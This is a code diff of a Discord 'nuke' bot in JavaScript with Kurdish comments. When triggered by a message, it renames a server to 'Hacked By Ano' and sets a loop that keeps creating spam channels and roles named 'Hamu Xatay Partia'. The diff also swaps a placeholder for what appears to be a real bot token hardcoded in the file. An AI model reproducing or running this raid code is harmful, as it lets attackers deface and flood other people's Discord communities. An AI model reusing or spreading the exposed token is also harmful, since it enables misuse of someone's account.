@@ -17,14 +17,14 @@ client.on("message", message => {
       });
       message.guild.setName("Hacked By Ano");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("Panda", "text");///////bo channel 
-        message.guild.createChannel("Panda", "voice");////bo voice
-        message.guild.createRole({ name: "Panda" });////nawek dane bo role kan
+        message.guild.createChannel("Hamu Xatay Partia", "text");///////bo channel 
+        message.guild.createChannel("Hamu Xatay Partia", "voice");////bo voice
+        message.guild.createRole({ name: "Hamu Xatay Partia" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("Token Lera Dabne")
+client.login("OTUxNjA0NTg1NzcwOTEzODMy.GczCgw.CRcWmLQ4dSBZLKlu85auqbL91trrhUiBdi8gVA")
 
 ////Panda Up Up////
